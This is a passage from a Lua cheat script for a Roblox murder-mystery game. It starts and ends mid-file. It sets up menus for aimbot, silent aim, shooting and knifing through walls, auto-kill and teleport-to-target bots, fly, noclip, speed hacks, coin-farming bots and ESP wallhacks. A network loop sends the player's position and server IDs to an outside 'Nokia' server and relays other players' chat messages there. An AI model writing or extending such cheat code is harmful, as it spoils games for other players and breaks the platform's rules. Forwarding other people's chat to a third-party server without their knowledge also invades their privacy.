				local sender=tostring(data.FromSpeaker or "")
				NOKia.handleMistralChat((sender==LocalPlayer.Name or sender==LocalPlayer.DisplayName) and LocalPlayer or player,data.Message)
				-- Chat mirroring: relay to server
				if flags.nokiaNetwork and NOKia.onlineSocket and NOKia.onlineState=="Connected" then
					NOKia.onlineSend({type="chat_mirror", text=data.Message, fromName=sender, fromUserId="0", channel="Legacy"})
				end
			end) end
		end
	end)
	task.spawn(function()
		local lastReconnect=-100
		local lastStats=-100
		local lastPosSend=-100
		while not Library.Unloaded do
			local now=os.clock()
			if flags.nokiaNetwork and NOKia.onlineSocket and NOKia.onlineState~="Connected" and now>(NOKia.onlineHelloDeadline or math.huge) then NOKia.onlineDisconnected() end
			if flags.nokiaNetwork and NOKia.onlineSocket and NOKia.onlineState=="Connected" and now-(NOKia.onlineLastPacket or now)>12 then NOKia.onlineDisconnected() end
			if flags.nokiaNetwork and not NOKia.onlineSocket and now>=(NOKia.onlineRetryAfter or 0) and now-lastReconnect>=5 then lastReconnect=now; NOKia.connectOnlineServices() end
			if flags.nokiaNetwork and NOKia.onlineSocket and NOKia.onlineState=="Connected" and now-lastStats>=5 then
				lastStats=now; NOKia.onlinePingStarted=now; NOKia.onlineSend({type="stats"})
			end
			-- Position tracking: send live position every 200ms for 2D map
			if flags.nokiaNetwork and NOKia.onlineSocket and NOKia.onlineState=="Connected" and now-lastPosSend>=0.2 then
				lastPosSend=now
				pcall(function()
					local char=LocalPlayer.Character
					local root=char and char:FindFirstChild("HumanoidRootPart")
					local hum=char and char:FindFirstChildOfClass("Humanoid")
					if root and hum then
						local pos=root.Position
						local cam=workspace.CurrentCamera
						NOKia.onlineSend({type="position",
							x=math.floor(pos.X*100)/100, y=math.floor(pos.Y*100)/100, z=math.floor(pos.Z*100)/100,
							health=math.floor(hum.Health*10)/10, maxHealth=hum.MaxHealth,
							walkspeed=hum.WalkSpeed, jumppower=hum.JumpPower,
							sitting=hum.Sit, grounded=hum.FloorMaterial~=Enum.Material.Air,
							lookX=math.floor(cam.CFrame.LookVector.X*100)/100,
							lookZ=math.floor(cam.CFrame.LookVector.Z*100)/100,
							placeId=game.PlaceId, jobId=game.JobId
						})
					end
				end)
			end
			local online=flags.nokiaNetwork and 1 or 0
			for userId,state in pairs(NOKia.nokiaUsers) do
				if not state.player.Parent then
					if state.badge then state.badge:Destroy() end
					NOKia.nokiaUsers[userId]=nil
				else
					online+=1
					NOKia.ensureNokiaBadge(state.player)
					if state.badge then
						for _,label in ipairs(state.badge:GetChildren()) do if label:IsA("TextLabel") then label.TextColor3=Color3.fromHSV((now*.16+userId%17/17)%1,.82,1) end end
					end
				end
			end
			if NOKia.onlineState~="Connected" then pcall(function() NOKia.nokiaOnlineLabel:SetText(NOKia.onlineText("status",NOKia.onlineStateText(NOKia.onlineState),online)) end) end
			pcall(function()
				local connected=NOKia.onlineState=="Connected"
				NOKia.nokiaChatConnectionLabel.Text=NOKia.onlineText("chatStatus",NOKia.onlineStateText(NOKia.onlineState))
				NOKia.nokiaChatConnectionLabel.TextColor3=connected and Color3.fromRGB(95,235,145) or Color3.fromRGB(255,155,110)
			end)
			for clientId,sentAt in pairs(NOKia.onlinePendingMessages or {}) do
				if now-sentAt>10 then
					NOKia.onlinePendingMessages[clientId]=nil
					notify("Le serveur Nokia n'a pas confirmé le message",4)
					NOKia.onlineDisconnected()
					break
				end
			end
			task.wait(.12)
		end
	end)
end

do local g=Tabs.Combat:AddLeftGroupbox("Murderer")
	g:AddToggle("KnifeWalls",{Text="Knife Through Walls",Tooltip="Your thrown knives ignore geometry. Aim at a player or anywhere on the map. Does not throw for you.",Callback=function(v) flags.knifeWalls=v end})
	g:AddToggle("InstantKnife",{Text="Instant Knife Throw",Tooltip="Skips the wind up and the flight time, so the knife lands the instant you press throw. Walls still block it unless Knife Through Walls is on.",Callback=function(v) flags.instantKnife=v end})
end
do local g=Tabs.Combat:AddLeftGroupbox("Murderer + Sheriff")
	g:AddToggle("AutoKill",{Text="Auto Kill",Tooltip="Murderer only. Knifes everyone in reach at once. The sheriff gun version was removed because it would not hit moving targets reliably.",Callback=function(v) flags.autoKill=v
		if v then notify("Auto Kill is reliable as murderer. As sheriff or hero the gun only lands on players standing still, moving targets are still being worked on.",10) end
	end})
	local killExceptSheriffButton=g:AddButton({Text="Kill Everyone Except Sheriff",Tooltip="As murderer, attacks every alive player once except the sheriff or hero. This is a one-off action, not a loop.",Func=function()
		NOKia.killEveryoneExceptGunRole()
	end})
	killExceptSheriffButton:AddKeyPicker("KillExceptSheriffKey",{Default="None",Mode="Press",Text="Kill Everyone Except Sheriff Key"})
	NOKia.addKeyTrash("KillExceptSheriffKey","Kill Everyone Except Sheriff",true)
	local aimKey=g:AddToggle("Aimbot",{Text="Aimbot",Tooltip="Hold the keybind to snap your camera to the closest enemy in your FOV.",Callback=function(v) flags.aimbot=v end})
		:AddKeyPicker("AimKey",{Default="MB2",Mode="Hold",Text="Aimbot",NoUI=false})
	NOKia.addKeyTrash("AimKey","Aimbot",false)
	g:AddToggle("SilentAim",{Text="Knife Silent Aim",Tooltip="Redirects your knife throws to the closest player in your FOV. Murderer only. The gun version was removed because it would not hit moving targets reliably.",Callback=function(v) flags.silentAim=v end})
	g:AddSlider("AimFov",{Text="Aim FOV",Tooltip="Radius in pixels around your cursor that counts as a valid target.",Default=120,Min=40,Max=400,Rounding=0,Callback=function(v) aimFov=v end})
	g:AddToggle("ShowFov",{Text="Show FOV Circle",Tooltip="Draws the aim radius. Only visible while an aim feature is on.",Callback=function(v) flags.showFov=v end})
end
do local g=Tabs.Combat:AddRightGroupbox("Sheriff")
	g:AddToggle("GunWalls",{Text="Gun Through Walls",Tooltip="Your shots ignore geometry. Aim at a player or anywhere on the map. Does not shoot for you.",Callback=function(v) flags.gunWalls=v end})
	g:AddToggle("GunEsp",{Text="Dropped Gun ESP",Tooltip="Highlights the sheriff gun once it is lying on the ground.",Callback=function(v) flags.gunEsp=v end})
	g:AddToggle("GunEspDist",{Text="Gun ESP Distance",Tooltip="Adds a distance label to the dropped gun highlight.",Callback=function(v) flags.gunEspDist=v end})
	g:AddToggle("AutoGun",{Text='Auto Grab <font color="#FF5C5C">P</font><font color="#FFB347">i</font><font color="#FFE45C">s</font><font color="#7EE787">t</font><font color="#5CC8FF">o</font><font color="#B392FF">F</font><font color="#FF8CC6">l</font><font color="#FF5C5C">i</font><font color="#FFB347">n</font><font color="#FFE45C">g</font><font color="#7EE787">u</font><font color="#5CC8FF">e</font>',Tooltip="Grabs the dropped gun the moment it appears, then returns you.",Callback=function(v) flags.autoGun=v end})
	g:AddButton({Text="Grab Gun Now",Tooltip="One-off grab of the dropped gun",Func=function()
		if findWeapon("Gun") then notify("You already have a gun"); return end
		if not (droppedGun or findDroppedGun()) then notify("No dropped gun on the map"); return end
		grabGunOnce()
	end})
end
do local g=Tabs.Player:AddLeftGroupbox("Movement")
	local flyToggle=g:AddToggle("Fly",{Text="Fly",Tooltip="WASD to move, Space up, Ctrl down. Relative to your camera.",Callback=function(v) flags.fly=v; if v then startFly() else stopFly() end end})
	local flyKey=flyToggle:AddKeyPicker("FlyKey",{Default="None",Mode="Toggle",SyncToggleState=true,Text="Fly"})
	NOKia.addKeyTrash("FlyKey","Fly",false)
	g:AddSlider("FlySpeed",{Text="Fly Speed",Tooltip="Studs per second while flying.",Default=60,Min=20,Max=250,Rounding=0,Callback=function(v) flags.flySpeed=v end})
	local noclipToggle=g:AddToggle("Noclip",{Text="Noclip",Tooltip="Walk through walls. Forced on during a fling, which needs it.",Callback=function(v) flags.noclip=v
		if not v then
			local ch=LocalPlayer.Character
			NOKia.recollide(ch and ch:FindFirstChildOfClass("Humanoid"))
		end
	end})
	local noclipKey=noclipToggle:AddKeyPicker("NoclipKey",{Default="None",Mode="Toggle",SyncToggleState=true,Text="Noclip"})
	NOKia.addKeyTrash("NoclipKey","Noclip",false)
	g:AddToggle("InfJump",{Text="Infinite Jump",Tooltip="Jump again any time, including mid-air.",Callback=function(v) flags.infJump=v end})
	g:AddToggle("UnlockCam",{Text="Unlock Camera",Tooltip="Removes the zoom limit. Combined with Noclip the camera also passes through walls.",Callback=function(v) flags.unlockCam=v; setUnlockCam(v) end})
end
do local g=Tabs.Player:AddRightGroupbox("Stats")
	g:AddSlider("WalkSpeed",{Text="Walk Speed",Tooltip="Well above the default is an easy way to get kicked.",Default=16,Min=16,Max=120,Rounding=0,Callback=function(v) local h=LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid"); if h then h.WalkSpeed=v end end})
	g:AddSlider("JumpPower",{Text="Jump Power",Default=50,Min=50,Max=250,Rounding=0,Callback=function(v) local h=LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid"); if h then h.UseJumpPower=true;h.JumpPower=v end end})
	g:AddButton({Text="Reset Character",Tooltip="Kills you so you respawn",Func=function() local h=LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid"); if h then h.Health=0 end end})
end
do local g=Tabs.Player:AddRightGroupbox("Movement Keybinds")
	g:AddButton({Text="Clear Fly Key",Tooltip="Removes the Fly keybind. You can also click the small key box next to Fly and press Escape.",Func=function()
		local key=Options.FlyKey; if key then key:SetValue({"None","Toggle",{}}) end
	end})
	g:AddButton({Text="Clear Noclip Key",Tooltip="Removes the Noclip keybind. You can also click the small key box next to Noclip and press Escape.",Func=function()
		local key=Options.NoclipKey; if key then key:SetValue({"None","Toggle",{}}) end
	end})
	g:AddLabel("The same key can be assigned to more than one feature.")
end
do local g=Tabs.Bot:AddLeftGroupbox("Coin Bot")
	g:AddToggle("AutoCoins",{Text="Auto Collect Coins",Tooltip="Moves to the nearest available coin. If another player takes it, the bot immediately chooses a different coin.",Callback=function(v) flags.autoCoins=v end})
	g:AddToggle("AutoCoinAvoidWalls",{Text="Smart Walking Mode",Default=true,Tooltip="Uses Roblox pathfinding to walk around walls, jump over obstacles, recover when stuck, and avoid the murderer.",Callback=function(v)
		flags.autoCoinAvoidWalls=v
		if v then
			local ch=LocalPlayer.Character
			NOKia.recollide(ch and ch:FindFirstChildOfClass("Humanoid"))
		end
		if NOKia.updateCoinTeleportOptions then NOKia.updateCoinTeleportOptions() end
	end})
	NOKia.coinStuckTeleportToggle=g:AddToggle("CoinTeleportWhenStuck",{Text="Teleport If Completely Stuck",Disabled=true,
		Tooltip="Teleports after repeated failed escapes or when the smart 5-to-10-second travel limit expires.",DisabledTooltip="Enable Smart Walking Mode first.",Callback=function(v) flags.coinTeleportWhenStuck=v end})
	NOKia.coinDangerTeleportToggle=g:AddToggle("CoinTeleportWhenDanger",{Text="Emergency Teleport From Murderer",Disabled=true,
		Tooltip="Triggers early when the murderer closes in, then teleports to the coin farthest from them.",DisabledTooltip="Enable Smart Walking Mode first.",Callback=function(v) flags.coinTeleportWhenDanger=v end})
	NOKia.updateCoinTeleportOptions=function()
		local enabled=flags.autoCoinAvoidWalls
		if not enabled then
			if NOKia.coinStuckTeleportToggle.Value then NOKia.coinStuckTeleportToggle:SetValue(false) end
			if NOKia.coinDangerTeleportToggle.Value then NOKia.coinDangerTeleportToggle:SetValue(false) end
		end
		NOKia.coinStuckTeleportToggle:SetDisabled(not enabled)
		NOKia.coinDangerTeleportToggle:SetDisabled(not enabled)
	end
	flags.autoCoinAvoidWalls=Toggles.AutoCoinAvoidWalls.Value==true
	NOKia.updateCoinTeleportOptions()
	local collectAllButton=g:AddButton({Text="EXPERIMENTAL — Collect All Map Coins",Tooltip="Teleports through the coins currently on the map in up to 1.5 seconds, skips any coin taken in the meantime, then returns you to your starting position.",Func=NOKia.collectAllMapCoins})
	collectAllButton:AddKeyPicker("CollectAllMapCoinsKey",{Default="None",Mode="Press",Text="Collect All Map Coins Key"})
	NOKia.addKeyTrash("CollectAllMapCoinsKey","EXPERIMENTAL — Collect All Map Coins",true)
	g:AddLabel("A reachable coin gets 5 to 10 seconds based on its real walking distance; otherwise it is skipped.")
	g:AddSlider("AutoCoinSpeed",{Text="Collect Speed",Tooltip="Movement speed used only while the coin bot is active.",Default=16,Min=8,Max=30,Rounding=0,Callback=function(v) autoCoinSpeed=v end})
end
do local g=Tabs.Bot:AddRightGroupbox("Route")
	g:AddToggle("CoinPath",{Text="Show 10-Coin Route",Default=true,Tooltip="Shows the complete plan from you through the next 10 coins. It recalculates when a coin is taken or danger changes.",Callback=function(v) flags.coinPath=v end})
	g:AddLabel("Yellow is the next coin; blue lines show the rest of the planned route.")
end
local coinBagGateToggle,coinLimitGateToggle,coinLimitSlider
local updateCoinBagGate
do local g=Tabs.Bot:AddLeftGroupbox("Role Bots")
	g:AddToggle("MurdererSheriffBot",{Text="Auto Kill Sheriff",Tooltip="As murderer, teleports in front of the sheriff with noclip, attacks once, then returns to your saved position.",Callback=function(v)
		flags.murdererSheriffBot=v
		if updateCoinBagGate then updateCoinBagGate() end
	end})
	g:AddToggle("KillRemainingAfterSheriff",{Text="Kill Remaining Players",Tooltip="After the sheriff or hero is eliminated, Auto Kill Sheriff continues with every remaining alive player.",Callback=function(v) flags.killRemainingAfterSheriff=v end})
	g:AddToggle("SheriffMurdererBot",{Text="Auto Kill Murderer",Tooltip="As sheriff, equips the gun, teleports near the murderer with noclip, fires once, then returns to your saved position.",Callback=function(v)
		flags.sheriffMurdererBot=v
		if updateCoinBagGate then updateCoinBagGate() end
	end})
	local function oneShotRoleAttack()
		task.spawn(function()
			local ok=false
			if myRole()=="Murderer" then
				ok=attackSheriffOnce()
			elseif isGunRole(myRole()) then
				ok=shootMurdererOnce()
			end
			if not ok then notify("No valid role target, weapon, or active character") end
		end)
	end
	local oneShotButton=g:AddButton({Text="One-Shot Role Attack",Tooltip="Uses your current role: as sheriff or hero, shoots the murderer once; as murderer, attacks the sheriff or hero once. It never repeats automatically.",Func=oneShotRoleAttack})
	oneShotButton:AddKeyPicker("OneShotRoleKillKey",{Default="None",Mode="Press",Text="One-Shot Role Attack Key"})
	NOKia.addKeyTrash("OneShotRoleKillKey","One-Shot Role Attack",true)
end
do local g=Tabs.Bot:AddRightGroupbox("Start Requirement")
	coinBagGateToggle=g:AddToggle("CoinBagBeforeRoleBot",{Text="Auto Collect Until Bag Full",Disabled=true,
		Tooltip="Collects coins automatically, then starts the selected Auto Kill bot when the coin bag is full.",
		DisabledTooltip="Enable Auto Kill Sheriff or Auto Kill Murderer first.",Callback=function(v)
			flags.coinBagBeforeRoleBot=v
			if v and coinLimitGateToggle and coinLimitGateToggle.Value then coinLimitGateToggle:SetValue(false) end
			if updateCoinBagGate then updateCoinBagGate() end
		end})
	coinLimitGateToggle=g:AddToggle("CoinLimitBeforeRoleBot",{Text="Use Specific Coin Limit",Disabled=true,
		Tooltip="Uses the coin limit below instead of waiting for the bag to be full.",
		DisabledTooltip="Enable Auto Kill Sheriff or Auto Kill Murderer first.",Callback=function(v)
			flags.coinLimitBeforeRoleBot=v
			if v and coinBagGateToggle.Value then coinBagGateToggle:SetValue(false) end
			if updateCoinBagGate then updateCoinBagGate() end
		end})
	coinLimitSlider=g:AddSlider("RoleBotCoinLimit",{Text="Coins Before Auto Kill",Disabled=true,Default=40,Min=1,Max=50,Rounding=0,
		Tooltip="The selected Auto Kill bot starts once this many coins have been collected.",Callback=function(v) roleBotCoinLimit=v end})
	updateCoinBagGate=function()
		local enabled=flags.murdererSheriffBot or flags.sheriffMurdererBot
		if not enabled then
			if coinBagGateToggle.Value then coinBagGateToggle:SetValue(false) end
			if coinLimitGateToggle.Value then coinLimitGateToggle:SetValue(false) end
		end
		coinBagGateToggle:SetDisabled(not enabled or flags.coinLimitBeforeRoleBot)
		coinLimitGateToggle:SetDisabled(not enabled)
		coinLimitSlider:SetDisabled(not enabled or not flags.coinLimitBeforeRoleBot)
	end
	updateCoinBagGate()
end
do local g=Tabs.GUI:AddLeftGroupbox("HUD Editor")
	g:AddToggle("GuiHud",{Text="Show Custom HUD",Default=true,Tooltip="Shows the custom text widgets you add to your screen.",Callback=function(v) flags.guiHud=v; HudGui.Enabled=v end})
	g:AddToggle("GuiEditMode",{Text="Edit Mode",Tooltip="Enable this, then drag any custom HUD widget with your mouse or finger.",Callback=function(v) flags.guiEditMode=v end})
	g:AddInput("HudWidgetText",{Text="Widget Text",Default="NOKia HUD",Finished=true,Tooltip="Text used for the next HUD widget."})
	g:AddButton({Text="Add Text Widget",Tooltip="Adds a draggable text widget to your Roblox screen.",Func=function()
		local text=Options.HudWidgetText.Value
		if not text or #tostring(text)==0 then notify("Type some text first"); return end
		addHudWidget({text=tostring(text),xs=.5,ys=.2}); saveHudLayout()
	end})
	g:AddButton({Text="Clear Text Widgets",Tooltip="Removes all custom HUD text widgets.",Func=function() clearHudWidgets(); notify("Custom HUD cleared") end})
	g:AddLabel("Enable Edit Mode to drag the widgets. Their positions are saved automatically.")
end
do local g=Tabs.GUI:AddRightGroupbox("Useful Widgets")
	g:AddButton({Text="Add Role Widget",Tooltip="Displays your current role: Innocent, Murderer, Sheriff or Hero.",Func=function()
		addHudWidget({kind="role",text="ROLE",xs=.5,ys=.18}); saveHudLayout()
	end})
	g:AddButton({Text="Add Coin Widget",Tooltip="Displays your current round coin count.",Func=function()
		addHudWidget({kind="coins",text="COINS",xs=.5,ys=.28}); saveHudLayout()
	end})
	g:AddButton({Text="Add Coin Bag Widget",Tooltip="Displays whether your coin bag is still collecting or full.",Func=function()
		addHudWidget({kind="bag",text="COIN BAG",xs=.5,ys=.38}); saveHudLayout()
	end})
	g:AddButton({Text="Add Bot Target Widget",Tooltip="Displays the coin currently targeted by the coin bot.",Func=function()
		addHudWidget({kind="target",text="BOT TARGET",xs=.5,ys=.48}); saveHudLayout()
	end})
	g:AddButton({Text="Add Clock Widget",Tooltip="Displays the current local time.",Func=function()
		addHudWidget({kind="clock",text="TIME",xs=.5,ys=.58}); saveHudLayout()
	end})
	g:AddButton({Text="Add Server Widget",Tooltip="Displays the number of players in the server.",Func=function()
		addHudWidget({kind="players",text="SERVER",xs=.5,ys=.68}); saveHudLayout()
	end})
	g:AddButton({Text="Add Ping Widget",Tooltip="Displays the current network ping.",Func=function()
		addHudWidget({kind="ping",text="PING",xs=.5,ys=.78}); saveHudLayout()
	end})
	g:AddButton({Text="Add Nokia Online Widget",Tooltip="Displays Nokia server ping plus connected users in this server and worldwide.",Func=function()
		addHudWidget({kind="nokiaonline",text="NOKIA",xs=.5,ys=.88}); saveHudLayout()
	end})
	g:AddButton({Text="Add Auto Kill Widget",Tooltip="Displays whether one of the Auto Kill bots is enabled.",Func=function()
		addHudWidget({kind="autokill",text="AUTO KILL",xs=.5,ys=.88}); saveHudLayout()
	end})
	g:AddButton({Text="Add Health Widget",Tooltip="Displays your current health.",Func=function()
		addHudWidget({kind="health",text="HEALTH",xs=.75,ys=.18}); saveHudLayout()
	end})
	g:AddButton({Text="Add Position Widget",Tooltip="Displays your current map coordinates.",Func=function()
		addHudWidget({kind="position",text="POS",xs=.75,ys=.28}); saveHudLayout()
	end})
	g:AddButton({Text="Add Weapon Widget",Tooltip="Displays the weapon currently equipped.",Func=function()
		addHudWidget({kind="weapon",text="WEAPON",xs=.75,ys=.38}); saveHudLayout()
	end})
	g:AddButton({Text="Add Round Status Widget",Tooltip="Displays whether you are alive or dead.",Func=function()
		addHudWidget({kind="alive",text="ROUND STATUS",xs=.75,ys=.48}); saveHudLayout()
	end})
	g:AddButton({Text="Add FOV Widget",Tooltip="Displays the current camera FOV.",Func=function()
		addHudWidget({kind="fov",text="FOV",xs=.75,ys=.58}); saveHudLayout()
	end})
end
do local g=Tabs.Visuals:AddLeftGroupbox("Player ESP")
	g:AddToggle("EspNames",{Text="Nametag ESP",Tooltip="Name, distance and round coins above each player.",Callback=function(v) flags.espNames=v end})
	g:AddToggle("EspBox",{Text="Box ESP",Tooltip="2D rectangle around each player that tracks their pose.",Callback=function(v) flags.espBox=v end})
	g:AddToggle("EspChams",{Text="Chams",Tooltip="Coloured through-wall outline on each player.",Callback=function(v) flags.espChams=v end})
	g:AddToggle("EspFill",{Text="Chams Fill",Tooltip="Fills the chams body instead of outlining it. Needs Chams on.",Callback=function(v) flags.espFill=v end})
	g:AddToggle("EspRole",{Text="Role Tags",Tooltip="Colours every ESP by role and shows [M] [S] [I] tags.",Callback=function(v) flags.espRoleTags=v end})
	g:AddToggle("EspSkeleton",{Text="Skeleton ESP",Tooltip="Draws bone lines over each player.",Callback=function(v) flags.espSkeleton=v end})
end
do local g=Tabs.Visuals:AddRightGroupbox("World & Render")
	g:AddToggle("CoinEsp",{Text="Coin ESP",Tooltip="Highlights every uncollected coin on the map.",Callback=function(v) flags.coinEsp=v end})
	g:AddToggle("TrapEsp",{Text="Trap ESP",Tooltip="UNTESTED. Murderer traps are invisible by design. This shows them through walls.",Callback=function(v) flags.trapEsp=v end})
	g:AddToggle("KillFeed",{Text="Kill Feed",Tooltip="Notifies you of every elimination, in any role including innocent.",Callback=function(v) flags.killFeed=v end})
	g:AddToggle("Fullbright",{Text="Fullbright",Tooltip="Removes darkness so nowhere on the map is unlit.",Callback=function(v) flags.fullbright=v; setFullbright(v) end})
	g:AddToggle("FpsBoost",{Text="FPS Boost",Tooltip="Strips particles, shadows, decals and post effects. Reversed on unload.",Callback=function(v) flags.fpsBoost=v; setFPSBoost(v) end})
	g:AddSlider("Fov",{Text="Field of View",Default=70,Min=70,Max=120,Rounding=0,Callback=function(v) pcall(function() Camera.FieldOfView=v end) end})
end

NOKia.buildLocalToolsPage=function()
	local radarPosition=UDim2.new(1,-22,0,92)
	pcall(function()
		local path=CONFIG_FOLDER.."/radar_layout.json"
		if typeof(isfile)=="function" and isfile(path) then
			local data=HttpService:JSONDecode(readfile(path))
			if type(data)=="table" then radarPosition=UDim2.new(data.xs or 1,data.xo or -22,data.ys or 0,data.yo or 92) end
		end
	end)
	local function saveRadarPosition(frame)
		local p=frame.Position
		pcall(function()
			if typeof(isfolder)=="function" and not isfolder(CONFIG_FOLDER) then makefolder(CONFIG_FOLDER) end
			writefile(CONFIG_FOLDER.."/radar_layout.json",HttpService:JSONEncode({xs=p.X.Scale,xo=p.X.Offset,ys=p.Y.Scale,yo=p.Y.Offset}))
		end)
	end
	local radarFrame=create("Frame",{Name="NOKia_LocalRadar",Active=true,AnchorPoint=Vector2.new(1,0),Position=radarPosition,Size=UDim2.fromOffset(190,190),BackgroundColor3=Color3.fromRGB(12,22,42),BackgroundTransparency=.12,Visible=false,ClipsDescendants=true,Parent=HudGui},{create("UICorner",{CornerRadius=UDim.new(1,0)}),create("UIStroke",{Color=Color3.fromRGB(80,160,255),Transparency=.18,Thickness=1.2})})
	local radarDragging,radarStartMouse,radarStartPosition=false,nil,nil
	bind(radarFrame.InputBegan,function(input)
		if flags.guiEditMode and (input.UserInputType==Enum.UserInputType.MouseButton1 or input.UserInputType==Enum.UserInputType.Touch) then
			radarDragging=true; radarStartMouse=input.Position; radarStartPosition=radarFrame.Position
		end
	end)
	bind(UserInputService.InputChanged,function(input)
		if radarDragging and (input.UserInputType==Enum.UserInputType.MouseMovement or input.UserInputType==Enum.UserInputType.Touch) then
			local delta=input.Position-radarStartMouse
			radarFrame.Position=UDim2.new(radarStartPosition.X.Scale,radarStartPosition.X.Offset+delta.X,radarStartPosition.Y.Scale,radarStartPosition.Y.Offset+delta.Y)
		end
	end)
	bind(UserInputService.InputEnded,function(input)
		if radarDragging and (input.UserInputType==Enum.UserInputType.MouseButton1 or input.UserInputType==Enum.UserInputType.Touch) then radarDragging=false; saveRadarPosition(radarFrame) end
	end)
	create("TextLabel",{Name="Title",BackgroundTransparency=1,AnchorPoint=Vector2.new(.5,0),Position=UDim2.new(.5,0,0,12),Size=UDim2.fromOffset(150,18),Font=Enum.Font.GothamBold,TextSize=12,TextColor3=Color3.fromRGB(224,241,255),Text="LOCAL RADAR",ZIndex=5,Parent=radarFrame})
	local roomLayer=create("Frame",{Name="RoomBackground",BackgroundTransparency=1,Size=UDim2.fromScale(1,1),ZIndex=0,Parent=radarFrame})
	for index=1,4 do
		create("Frame",{Name="GridV"..index,AnchorPoint=Vector2.new(.5,.5),Position=UDim2.fromScale(index/5,.5),Size=UDim2.fromOffset(1,146),BorderSizePixel=0,BackgroundColor3=Color3.fromRGB(100,160,230),BackgroundTransparency=.55,ZIndex=1,Visible=false,Parent=roomLayer})
		create("Frame",{Name="GridH"..index,AnchorPoint=Vector2.new(.5,.5),Position=UDim2.fromScale(.5,index/5),Size=UDim2.fromOffset(146,1),BorderSizePixel=0,BackgroundColor3=Color3.fromRGB(100,160,230),BackgroundTransparency=.55,ZIndex=1,Visible=false,Parent=roomLayer})
	end
	create("Frame",{Name="CrossX",AnchorPoint=Vector2.new(.5,.5),Position=UDim2.fromScale(.5,.5),Size=UDim2.fromOffset(150,1),BorderSizePixel=0,BackgroundColor3=Color3.fromRGB(135,190,250),BackgroundTransparency=.25,ZIndex=3,Parent=radarFrame})
	create("Frame",{Name="CrossY",AnchorPoint=Vector2.new(.5,.5),Position=UDim2.fromScale(.5,.5),Size=UDim2.fromOffset(1,150),BorderSizePixel=0,BackgroundColor3=Color3.fromRGB(135,190,250),BackgroundTransparency=.25,ZIndex=3,Parent=radarFrame})
	create("TextLabel",{Name="You",AnchorPoint=Vector2.new(.5,.5),Position=UDim2.fromScale(.5,.5),Size=UDim2.fromOffset(12,12),BackgroundColor3=Color3.fromRGB(245,250,255),Text="",ZIndex=5,Parent=radarFrame},{create("UICorner",{CornerRadius=UDim.new(1,0)})})
	local points={}
	local roomBlocks={}
	local radar3D={}
	local function point(id,color,text)
		local marker=points[id]
		if not marker then marker=create("TextLabel",{Name="Point_"..id,AnchorPoint=Vector2.new(.5,.5),Size=UDim2.fromOffset(10,10),BackgroundColor3=color,BorderSizePixel=0,Text=text or "",Font=Enum.Font.GothamBold,TextSize=8,TextColor3=Color3.new(1,1,1),ZIndex=5,Parent=radarFrame},{create("UICorner",{CornerRadius=UDim.new(1,0)}),create("UIStroke",{Color=Color3.new(1,1,1),Transparency=.3})}); points[id]=marker end
		marker.BackgroundColor3=color; marker.Text=text or ""; return marker
	end
	local function setPoint(id,position,color,text,origin,range,seen)
		-- Keep the radar flat. Camera pitch must never turn a point above us when
		-- the player simply looks down.
		local delta=position-origin
		local right=Vector3.new(Camera.CFrame.RightVector.X,0,Camera.CFrame.RightVector.Z)
		local forward=Vector3.new(Camera.CFrame.LookVector.X,0,Camera.CFrame.LookVector.Z)
		if right.Magnitude<.01 or forward.Magnitude<.01 then return end
		local flat=Vector2.new(delta:Dot(right.Unit),-delta:Dot(forward.Unit))
		local distance=flat.Magnitude
		local scale=math.min(distance/range,1)*73
		local marker=point(id,color,text)
		marker.Position=UDim2.fromOffset(95+(distance>.01 and flat.X/distance*scale or 0),95+(distance>.01 and flat.Y/distance*scale or 0))
		marker.Visible=true; seen[id]=true
	end
	local function set3D(id,part,color,text,seen)
		local marker=radar3D[id]
		if not marker then
			marker=create("BillboardGui",{Name="NOKia_3DRadar_"..id,Size=UDim2.fromOffset(126,20),StudsOffsetWorldSpace=Vector3.new(0,2.7,0),AlwaysOnTop=true,Parent=EspGui},
				{create("TextLabel",{BackgroundColor3=Color3.fromRGB(8,16,30),BackgroundTransparency=.3,Size=UDim2.fromScale(1,1),Font=Enum.Font.GothamBold,TextSize=11,TextColor3=color,TextStrokeTransparency=.6,Text=text},{create("UICorner",{CornerRadius=UDim.new(0,6)}),create("UIStroke",{Color=color,Transparency=.35})})})
			radar3D[id]=marker
		end
		marker.Adornee=part; marker.Enabled=true
		local label=marker:FindFirstChildOfClass("TextLabel"); if label then label.Text=text; label.TextColor3=color end
		seen[id]=true
	end
	local lastRoomDraw=0
	local function refreshRoomBackground(root,range)
		for _,node in ipairs(roomLayer:GetChildren()) do if node.Name:sub(1,4)=="Grid" then node.Visible=flags.radarRoomBackground end end
		if not flags.radarRoomBackground then
			for _,block in pairs(roomBlocks) do block.Visible=false end
			return
		end
		if os.clock()-lastRoomDraw<.35 then return end
		lastRoomDraw=os.clock()
		local seen={}; local params=OverlapParams.new(); params.FilterType=Enum.RaycastFilterType.Exclude; params.FilterDescendantsInstances={LocalPlayer.Character}
		local ok,nearby=pcall(function() return workspace:GetPartBoundsInRadius(root.Position,range,params) end)
		if not ok or type(nearby)~="table" then return end
		local count=0
		for _,part in ipairs(nearby) do
			if count>=35 then break end
			-- Ignore huge floor slabs: they hide the actual walls/room shape.
			local isHugeFloor=part.Size.X>range*.75 and part.Size.Z>range*.75
			if not isHugeFloor and part.Anchored and part.CanCollide and part.Transparency<.9 and part.Size.X>=2 and part.Size.Z>=2 then
				count+=1; local block=roomBlocks[part]
				if not block then block=create("Frame",{Name="RoomBlock",AnchorPoint=Vector2.new(.5,.5),BorderSizePixel=0,BackgroundColor3=Color3.fromRGB(92,158,225),BackgroundTransparency=.42,ZIndex=1,Parent=roomLayer},{create("UICorner",{CornerRadius=UDim.new(0,2)})}); roomBlocks[part]=block end
				local delta=part.Position-root.Position
				local right=Vector3.new(Camera.CFrame.RightVector.X,0,Camera.CFrame.RightVector.Z).Unit
				local forward=Vector3.new(Camera.CFrame.LookVector.X,0,Camera.CFrame.LookVector.Z).Unit
				local x,z=delta:Dot(right),-delta:Dot(forward)
				block.Position=UDim2.fromOffset(95+x/range*73,95+z/range*73)
				block.Size=UDim2.fromOffset(math.clamp(part.Size.X/range*146,2,76),math.clamp(part.Size.Z/range*146,2,76))
				block.Visible=true; seen[part]=true
			end
		end
		for part,block in pairs(roomBlocks) do if not seen[part] or not part.Parent then block.Visible=false end end
	end
	NOKia.radarRange=200
	bind(RunService.RenderStepped,function()
		radarFrame.Visible=flags.radar2D and flags.guiHud
		if not (radarFrame.Visible or flags.radar3D) then return end
